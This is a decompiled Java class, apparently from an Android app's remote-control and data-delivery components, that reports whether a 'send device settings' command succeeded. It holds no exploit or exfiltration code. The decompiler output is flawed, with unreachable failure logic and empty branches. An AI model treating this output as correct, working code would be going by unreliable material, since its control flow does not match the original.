package com.vvt.appengine.a;

import android.os.ConditionVariable;
import com.vvt.datadeliverymanager.a.a;
import com.vvt.datadeliverymanager.i;
import com.vvt.remotecontrol.output.RmtCtrlOutputStatusMessage;

class bb
  implements a
{
  bb(ba paramba) {}
  
  public void a(i parami)
  {
    boolean bool = ba.a();
    if (bool) {}
  }
  
  public void b(i parami)
  {
    boolean bool1 = ba.a();
    if (bool1) {}
    bool1 = parami.f();
    RmtCtrlOutputStatusMessage localRmtCtrlOutputStatusMessage;
    boolean bool2;
    String str;
    if (bool1)
    {
      localRmtCtrlOutputStatusMessage = ba.a(this.a);
      bool2 = true;
      localRmtCtrlOutputStatusMessage.setSuccess(bool2);
      localRmtCtrlOutputStatusMessage = ba.a(this.a);
      str = "Send device settings command is complete.";
      localRmtCtrlOutputStatusMessage.setMessage(str);
    }
    for (;;)
    {
      ba.b(this.a).open();
      return;
      localRmtCtrlOutputStatusMessage = ba.a(this.a);
      bool2 = false;
      localRmtCtrlOutputStatusMessage.setSuccess(false);
      localRmtCtrlOutputStatusMessage = ba.a(this.a);
      str = parami.e();
      localRmtCtrlOutputStatusMessage.setMessage(str);
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/appengine/a/bb.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */